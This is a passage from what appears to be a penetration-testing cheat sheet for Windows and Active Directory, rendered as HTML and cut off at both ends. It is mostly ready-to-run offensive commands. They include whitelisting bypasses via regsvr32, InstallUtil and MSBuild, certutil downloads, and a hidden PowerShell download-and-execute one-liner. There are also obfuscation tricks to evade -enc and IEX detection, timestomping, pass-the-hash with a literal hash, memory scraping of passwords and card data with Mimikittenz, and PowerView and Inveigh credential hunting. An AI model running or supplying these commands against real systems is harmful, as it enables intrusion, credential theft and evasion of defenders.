1. cmd.exe /k &lt; script.txt 2. cscript.exe //E:vbscript script.txt 3. Get-Content script.txt | iex 9. Malicious Troubleshooting packs - MSDT.exe Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/ Thanks to @nberthaume, @Killswitch_GUI 10. InstallUtil.exe A signed MS binary that loads assemblies and executes - One of the best. Examples here: https://gist.github.com/subTee 11. Regsvcs/Regasm See: https://gist.github.com/subTee/fb09ef511e592e6f7993 These 2 are Excellent. 12. regsvr32.exe https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302 This one is just simply amazing... regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll 13. Msbuild.exe http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html ``` ## Certutil https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46 File download ``` certutil -urlcache -split -f http://example.com/file ``` ## Active Directory Enumeration ### Adfind www.joeware.net/freetools/tools/adfind/ ``` AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=computer&quot; &gt; domain_computers.txt

AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=computer&quot; distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion &gt; domain_computers_light.txt

AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=user&quot; samaccountname description pwdlastset orclcommonattribute &gt; domain_users_light.txt
</pre></div>
</td></tr></table>

<h2 id="powershell">Powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h2>
<p>List help for cmdlet: <code class="codehilite">Get-Help [cmdlet] -full</code></p>
<p>List available properties and methods: <code class="codehilite">Get-Member</code></p>
<p>For-each loop: <code class="codehilite">ForEach-Object { $_ }</code></p>
<p>Search for string (like grep): <code class="codehilite">Select-String -path [file] -pattern [string]</code></p>
<p>Timestomp</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="o">$</span><span class="nt">file</span><span class="o">=(</span><span class="nt">gi</span> <span class="nt">c</span><span class="p">:</span><span class="nd">file</span><span class="p">.</span><span class="nc">exe</span><span class="o">);</span>
<span class="o">$</span><span class="nt">date</span><span class="o">=</span><span class="s1">&#39;01/03/2009 12:12 pm&#39;</span><span class="o">;</span>
<span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">LastWriteTime</span><span class="o">=$</span><span class="nt">date</span><span class="o">;</span>
<span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">LastAccessTime</span><span class="o">=$</span><span class="nt">date</span><span class="o">;</span>
<span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">CreationTime</span><span class="o">=$</span><span class="nt">date</span>
</pre></div>
</td></tr></table>

<p>Show last system boot time</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="x">Get-WmiObject win32_operatingsystem | select csname, @</span><span class="cp">{</span><span class="nf">LABEL</span><span class="o">=</span><span class="s1">&#39;LastBootUpTime&#39;</span><span class="o">;</span> <span class="na">EXPRESSION</span><span class="o">=</span><span class="cp">{</span><span class="nv">$_.ConverttoDateTime</span><span class="o">(</span><span class="nv">$_.lastbootuptime</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
</pre></div>
</td></tr></table>

<p>Wrap binary execution in a powershell loop</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">powershell</span> <span class="nt">foreach</span> <span class="o">($</span><span class="nt">target</span> <span class="nt">in</span> <span class="o">(</span><span class="nt">get-content</span> <span class="nt">c</span><span class="p">:</span><span class="nd">usersusernameappdatalocaltemphosts_da_loggedin_unique</span><span class="p">.</span><span class="nc">txt</span><span class="o">))</span> <span class="p">{</span> <span class="err">&quot;</span><span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="err">$</span><span class="n">Target</span><span class="p">:</span><span class="err">&quot;</span><span class="p">;</span> <span class="err">(</span><span class="n">c</span><span class="p">:</span><span class="n">programdatasd</span><span class="o">.</span><span class="n">exe</span> <span class="o">./</span><span class="n">administrator</span><span class="o">@</span><span class="err">$</span><span class="n">target</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="n">a4bab1c7d4bef62d4c22043ddbf1312c</span><span class="p">)</span> <span class="p">}</span><span class="err">`</span>
</pre></div>
</td></tr></table>

<p>Download a file</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="x">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = </span><span class="cp">{</span><span class="nv">$true</span><span class="cp">}</span><span class="x">;(new-object system.net.webclient).downloadfile(&quot;https://www.mydomain.com/file&quot;,&quot;C:UsersusernameAppDataLocalTempfile.txt&quot;)</span>
</pre></div>
</td></tr></table>

<p>Encode string</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>echo &quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot; | iconv --to-code UTF-16LE | base64 -w 0
</pre></div>
</td></tr></table>

<p>List recently modified files in path (U:)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-Childitem u: -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1) } | foreach {&quot;$($_.LastWriteTime) :: $($_.Fullname) &quot; }
</pre></div>
</td></tr></table>

<p>List Files</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Select-String -Path c:fso*.txt, c:fso*.log -pattern ed
</pre></div>
</td></tr></table>

<p>List First 100 Files</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-ChildItem -Path XXX |Select -First 100 Fullname
</pre></div>
</td></tr></table>

<p>List a Process's Loaded Modules (DLL)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>get-process -id 1234|select -expand modules
</pre></div>
</td></tr></table>

<p>Remote Command Execution using MMC</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
</pre></div>
</td></tr></table>

<p>Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C<span><span class="MathJax_Preview">,ADMIN</span><script type="math/tex">,ADMIN</script></span>)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-ItemProperty HKLM:SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem |Select LocalAccountTokenFilterPolicy |fl
</pre></div>
</td></tr></table>

<p>Test User Credentials</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powerpick $password = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential (&quot;domainname&quot;, $password);
</pre></div>
</td></tr></table>

<p>Search for SSN</p>
<p><a href="https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx">https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$SSN_Regex = &quot; [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}&quot; ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; &quot;[*] SSN Search Complete!&quot;
</pre></div>
</td></tr></table>

<p>Enumerate the use of the Windows Server Update Services (WSUS)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-ItemProperty -Path Registry::&quot;HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate&quot; |Select-Object -ExpandProperty WUServer

Get-ItemProperty -Path Registry::&quot;HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate&quot; |Select-Object -ExpandProperty WUStatusServer

Get-ItemProperty -Path Registry::&quot;HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdateAU&quot; |Select-Object -ExpandProperty UseWUServer

reg query HKEY_LOCAL_MACHINESOFTWAREPoliciesMicrosoftWindowsWindowsUpdate
</pre></div>
</td></tr></table>

<p>Get unquoted service paths</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;.&quot;) +4)) -match &quot;.* .*&quot;}
</pre></div>
</td></tr></table>

<h3 id="find-files-custom">Find-Files (custom)<a class="headerlink" href="#find-files-custom" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Find-Files -searchBase &quot;i:&quot; -searchTerms &quot;*web.xml*,*web.config*,*password*,*tomcat-users.xml*&quot; -LogPath &quot;C:UsersusernameAppDataLocalTemp&quot;
</pre></div>
</td></tr></table>

<h3 id="get-enumeration-custom">Get-Enumeration (custom)<a class="headerlink" href="#get-enumeration-custom" title="Permanent link">&para;</a></h3>
<p>Run Local and Domain enumeration functions on the local host.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-Enumeration -Path . -Local -Domain
</pre></div>
</td></tr></table>

<h3 id="download-and-execute-iex">Download and execute IEX<a class="headerlink" href="#download-and-execute-iex" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powershell -nop -w hidden -c &quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot;
</pre></div>
</td></tr></table>

<h3 id="encodedcommand-and-iex-detection-bypass">EncodedCommand and IEX detection bypass<a class="headerlink" href="#encodedcommand-and-iex-detection-bypass" title="Permanent link">&para;</a></h3>
<p>Author: Dave Kennedy<br />
Source: <a href="https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/">https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/</a></p>
<p>Avoid detection of -enc</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powershell -window hidden -C &quot;set-variable -name &quot;C&quot; -value &quot;-&quot;; set-variable -name &quot;s&quot; -value &quot;e&quot;; set-variable -name &quot;q&quot; -value &quot;c&quot;; set-variable -name &quot;P&quot; -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() &quot;
</pre></div>
</td></tr></table>

<p>Avoid detection of IEX</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powershell -window hidden -C &quot;set-variable -name &quot;LB&quot; -value &quot;I&quot;; set-variable -name &quot;I&quot; -value &quot;E&quot;; set-variable -name &quot;V&quot; -value &quot;X&quot;; set-variable -name &quot;wP&quot; -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() (&#39;&#39;)&quot;
</pre></div>
</td></tr></table>

<h3 id="bloodhound">Bloodhound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">iex</span><span class="o">((</span><span class="nt">new-object</span> <span class="nt">system</span><span class="p">.</span><span class="nc">net</span><span class="p">.</span><span class="nc">webclient</span><span class="o">)</span><span class="p">.</span><span class="nc">downloadstring</span><span class="o">(</span><span class="s1">&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1&#39;</span><span class="o">));</span><span class="nt">Invoke-Bloodhound</span> <span class="nt">-CSVFolder</span> <span class="nt">c</span><span class="p">:</span><span class="nd">temp</span> <span class="nt">-CSVPrefix</span>

<span class="nt">Invoke-BloodHound</span> <span class="nt">-DomainController</span> <span class="nt">-Domain</span> <span class="nt">-CSVFolder</span> <span class="nt">C</span><span class="p">:</span><span class="nd">userspubliclibraries</span> <span class="nt">-CSVPrefix</span> <span class="nt">-CollectionMethod</span> <span class="nt">Stealth</span>
</pre></div>
</td></tr></table>

<h3 id="mimikittenz">Mimikittenz<a class="headerlink" href="#mimikittenz" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p>
<p>mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</p>
<p>mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:</p>
<ul>
<li>TRACK2 (CreditCard) data from merchant/POS processes</li>
<li>PII data</li>
<li>Encryption Keys &amp; All the other goodstuff</li>
</ul>
<p>Execution</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-Mimikittenz
</pre></div>
</td></tr></table>

<p>Customizations</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Custom regex - The syntax for adding custom regex is as follows:
[mimikittenz.MemProcInspector]::AddRegex(&quot;&quot;,&quot;&quot;)

Custom target process - Just append your target proccess name into the array:
[mimikittenz.MemProcInspector]::InspectManyProcs(&quot;iexplore&quot;,&quot;chrome&quot;,&quot;firefox&quot;)
</pre></div>
</td></tr></table>

<h3 id="powerup">PowerUp<a class="headerlink" href="#powerup" title="Permanent link">&para;</a></h3>
<p>Performs multiple local host privilege escalation checks for common Windows misconfigurations.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-AllChecks
</pre></div>
</td></tr></table>

<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf">See cheat sheet for more commands</a></p>
<h3 id="powerview">PowerView<a class="headerlink" href="#powerview" title="Permanent link">&para;</a></h3>
<ul>
<li>Requires domain user privileges</li>
</ul>
<p>Find Administrative users logged in across the domain – default group = Domain Admins)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-UserHunter -Threads 15 -NoPing [-GroupName &quot;Enterprise Admins&quot;]
Invoke-UserHunter -Threads 20 -GroupName &quot;Domain Admins&quot; -SearchForest -CheckAccess
</pre></div>
</td></tr></table>

<p>Find User (Stealthy via Fileshares)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName &quot;Enterprise Admins&quot;] [-UserName &quot;svcAccount&quot;]
</pre></div>
</td></tr></table>

<p>Get domain user info</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetUser [-UserName john]

Get-NetUser -Domain | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name=&#39;memberof&#39;;Expression={[string]::join(&quot;;&quot;,($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name| export-csv userprops_members.csv
</pre></div>
</td></tr></table>

<p>Find group names</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetGroup [-GroupName *admin*]
</pre></div>
</td></tr></table>

<p>Get group members</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetGroupMember [-GroupName &quot;Domain Admins&quot;]
</pre></div>
</td></tr></table>

<p>Find open shares – Noisy</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-ShareFinder -CheckShareAccess
</pre></div>
</td></tr></table>

<p>Find open (non-default i.e. C$) shares by LDAP source</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-ShareFinder -ComputerADSPath &quot;LDAP://OU=Servers,OU=IT,DC=domain,DC=com&quot; -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:windowstempserver_shares.txt

Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess
</pre></div>
</td></tr></table>

<p>Find interesting files</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powershell Invoke-FileFinder -ComputerName -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv
</pre></div>
</td></tr></table>

<p>Find hosts where the current user is local admin – Noisy</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Find-LocalAdminAccess
</pre></div>
</td></tr></table>

<p>Get details of all domain computers and export to a CSV file for easy viewing</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-computerproperty -Domain -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name=&#39;memberof&#39;;Expression={[string]::join(&quot;;&quot;,($_.memberof))}}|export-csv computerprops.csv
</pre></div>
</td></tr></table>

<p>Get Computers with Unconstrained Delegation</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetComputer -Unconstrained |ft -a
</pre></div>
</td></tr></table>

<p>Get Users &amp; Computers Trusted for Delegation</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl

Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl
</pre></div>
</td></tr></table>

<h4 id="net-functions">net * Functions:<a class="headerlink" href="#net-functions" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetDomain - gets the name of the current user&#39;s domain
Get-NetForest - gets the forest associated with the current user&#39;s domain
Get-NetForestDomain - gets all domains for the current forest
Get-NetDomainController - gets the domain controllers for the current computer&#39;s domain
Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)
Add-NetUser - adds a local or domain user
Get-NetComputer - gets a list of all current servers in the domain
Get-NetPrinter - gets an array of all current computers objects in a domain
Get-NetOU - gets data for domain organization units
Get-NetSite - gets current sites in a domain
Get-NetSubnet - gets registered subnets for a domain
Get-NetGroup - gets a list of all current groups in a domain
Get-NetGroupMember - gets a list of all current users in a specified domain group
Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts
Add-NetGroupUser - adds a local or domain user to a local or domain group
Get-NetFileServer - get a list of file servers used by current domain users
Get-DFSshare - gets a list of all distribute file system shares on a domain
Get-NetShare - gets share information for a specified server
Get-NetLoggedon - gets users actively logged onto a specified server
Get-NetSession - gets active sessions on a specified server
Get-NetRDPSession - gets active RDP sessions for a specified server (like qwinsta)
Get-NetProcess - gets the remote processes and owners on a remote server
Get-UserEvent - returns logon or TGT events from the event log for a specified host
Get-ADObject - takes a domain SID and returns the user, group, or computer
object associated with it
Set-ADObject - takes a SID, name, or SamAccountName to query for a specified
domain object, and then sets a specified &#39;PropertyName&#39; to a
specified &#39;PropertyValue&#39;
</pre></div>
</td></tr></table>

<h4 id="gpo-functions">GPO functions<a class="headerlink" href="#gpo-functions" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-GptTmpl - parses a GptTmpl.inf to a custom object
Get-NetGPO - gets all current GPOs for a given domain
Get-NetGPOGroup - gets all GPOs in a domain that set &quot;Restricted Groups&quot;
on on target machines
Find-GPOLocation - takes a user/group and makes machines they have effective
rights over through GPO enumeration and correlation
Find-GPOComputerAdmin - takes a computer and determines who has admin rights over it
through GPO enumeration
Get-DomainPolicy - returns the default domain or DC policy
</pre></div>
</td></tr></table>

<h4 id="user-hunting-functions">User-Hunting Functions:<a class="headerlink" href="#user-hunting-functions" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
Invoke-StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
Invoke-ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines
Invoke-UserEventHunter - hunts for user logon events in domain controller event logs
</pre></div>
</td></tr></table>

<h4 id="domain-trust-functions">Domain Trust Functions:<a class="headerlink" href="#domain-trust-functions" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-NetDomainTrust - gets all trusts for the current user&#39;s domain
Get-NetForestTrust - gets all trusts for the forest associated with the current user&#39;s domain
Find-ForeignUser - enumerates users who are in groups outside of their principal domain
Find-ForeignGroup - enumerates all the members of a domain&#39;s groups and finds users that are outside of the queried domain
Invoke-MapDomainTrust - try to build a relational mapping of all domain trusts
</pre></div>
</td></tr></table>

<h4 id="metafunctions">MetaFunctions:<a class="headerlink" href="#metafunctions" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Invoke-ShareFinder - finds (non-standard) shares on hosts in the local domain
Invoke-FileFinder - finds potentially sensitive files on hosts in the local domain
Find-LocalAdminAccess - finds machines on the domain that the current user has local admin access to
Find-UserField - searches a user field for a particular term
Find-ComputerField - searches a computer field for a particular term
Get-ExploitableSystem - finds systems likely vulnerable to common exploits
Invoke-EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain
</pre></div>
</td></tr></table>

<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf">HarmJ0y PowerView Cheat Sheet PDF</a><br />
<a href="https://gist.github.com/HarmJ0y/3328d954607d71362e3c">HarmJ0y's PowerView 2.0 Tricks Gist</a></p>
<h3 id="inveigh">Inveigh<a class="headerlink" href="#inveigh" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<p>Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system.</p>
<ul>
<li>The main Inveigh LLMNR/NBNS spoofer function.</li>
</ul>
<p><code class="codehilite">Invoke-Inveigh</code></p>
<h6 id="privilege-requirements">Privilege Requirements:<a class="headerlink" href="#privilege-requirements" title="Permanent link">&para;</a></h6>
<ul>
<li>Elevated Administrator or SYSTEM</li>
</ul>
<h6 id="features">Features:<a class="headerlink" href="#features" title="Permanent link">&para;</a></h6>
<ul>
<li>IPv4 LLMNR/NBNS spoofer with granular control</li>
<li>NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB</li>
<li>Basic auth cleartext credential capture over HTTP/HTTPS</li>
<li>WPAD server capable of hosting a basic or custom wpad.dat file</li>
<li>HTTP/HTTPS server capable of hosting limited content</li>
<li>Granular control of console and file output</li>
<li>Run time control</li>
</ul>
<h3 id="powershell-wout-powershell">Powershell W/out Powershell<a class="headerlink" href="#powershell-wout-powershell" title="Permanent link">&para;</a></h3>
<ul>
<li>MsBuild.exe<br />
<a href="https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml">https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml</a></li>
</ul>
<h3 id="get-indexeditem">Get-IndexedItem<a class="headerlink" href="#get-indexeditem" title="Permanent link">&para;</a></h3>
<p>Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents</p>
<p>Sources:<br />
<a href="https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae">https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae</a><br />
<a href="https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1">https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1</a></p>
<h3 id="interacting-w-windows-api">Interacting w/ Windows API<a class="headerlink" href="#interacting-w-windows-api" title="Permanent link">&para;</a></h3>
<p><a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/">https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/</a></p>
<h4 id="example-lock-workstation-and-messagebox">Example – Lock Workstation and MessageBox<a class="headerlink" href="#example-lock-workstation-and-messagebox" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="s">@&quot;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">;</span>

<span class="n">public</span> <span class="k">static</span> <span class="k">class</span> <span class="n">User32</span>
<span class="p">{</span>
<span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;user32.dll&quot;</span><span class="p">,</span> <span class="n">CharSet</span><span class="o">=</span><span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
<span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">MessageBox</span><span class="p">(</span>
<span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="c1">/// Parent window handle</span>
<span class="n">String</span> <span class="n">text</span><span class="p">,</span> <span class="c1">/// Text message to display</span>
<span class="n">String</span> <span class="n">caption</span><span class="p">,</span> <span class="c1">/// Window caption</span>
<span class="kt">int</span> <span class="n">options</span><span class="p">);</span> <span class="c1">/// MessageBox type</span>
<span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;user32.dll&quot;</span><span class="p">,</span> <span class="n">CharSet</span><span class="o">=</span><span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
<span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">LockWorkStation</span><span class="p">();</span>

<span class="p">}</span>
<span class="s">&quot;@</span>

<span class="p">[</span><span class="n">USER32</span><span class="p">]</span><span class="o">::</span><span class="n">LockWorkStation</span><span class="p">()</span>
</pre></div>
</td></tr></table>

<p>List static methods</p>
